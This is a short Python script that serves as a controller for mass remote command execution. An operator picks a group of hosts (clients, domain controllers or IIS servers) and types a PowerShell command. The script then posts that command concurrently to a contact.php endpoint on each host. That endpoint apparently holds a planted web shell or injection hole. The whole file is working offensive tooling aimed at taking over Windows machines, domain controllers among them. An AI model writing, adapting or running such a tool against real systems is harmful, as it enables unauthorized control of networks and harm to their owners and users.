import requests
import time
import json
from concurrent.futures import ThreadPoolExecutor, as_completed

ALL_CLIENTS = [
    "192.168.1.1",
    "192.168.1.2",
    # ...
]
ALL_DC = [
    "192.168.1.1",
    # ...
]
ALL_IIS = [
    "192.168.1.2",
    # ...
]

PORT = 8080
TIMEOUT = 5
CONCURRENCY = 8
THROTTLE_MS = 50

def send_to(client, port, command):
    url = f"http://{client}:{port}/contact.php"
    
    # Send as form data
    data = {"input_word": command}
    
    try:
        # Using form data approach
        r = requests.post(url, data=data, timeout=TIMEOUT)
        
        return (client, r.status_code, r.text[:200])
    except Exception as e:
        return (client, "ERR", str(e))
    
def interface():
    print("Select target group:")
    print("1. All Clients")
    print("2. All Domain Controllers")
    print("3. All IIS Servers")
    
    choice = input("Enter Choice (1-3): ")
    
    POWERSHELL_COMMAND = input("Input Powershell Command: ")
    
    if choice == '1':
        return ALL_CLIENTS, POWERSHELL_COMMAND
    elif choice == '2':
        return ALL_DC, POWERSHELL_COMMAND
    elif choice == '3':
        return ALL_IIS, POWERSHELL_COMMAND
    else:
        print("Invalid choice, defaulting to All Clients.")
        return ALL_CLIENTS, POWERSHELL_COMMAND

def main():
    # Loops the terminal interface
    while True:
        CLIENT_CHOICE, POWERSHELL_COMMAND = interface()

        with ThreadPoolExecutor(max_workers=CONCURRENCY) as ex:
            futures = []
            for client in CLIENT_CHOICE:
                # Send command to each client with throttling
                futures.append(ex.submit(send_to, client, PORT, POWERSHELL_COMMAND))
                time.sleep(THROTTLE_MS / 1000.0)

            for fut in as_completed(futures):
                target, status, response = fut.result()
                print(f"{target} -> {status}: {response}")
        
        exit = input("Do you want to exit? (y/n): ")
        if exit.lower() == 'y':
            break
        else:
            continue

if __name__ == "__main__":
    main()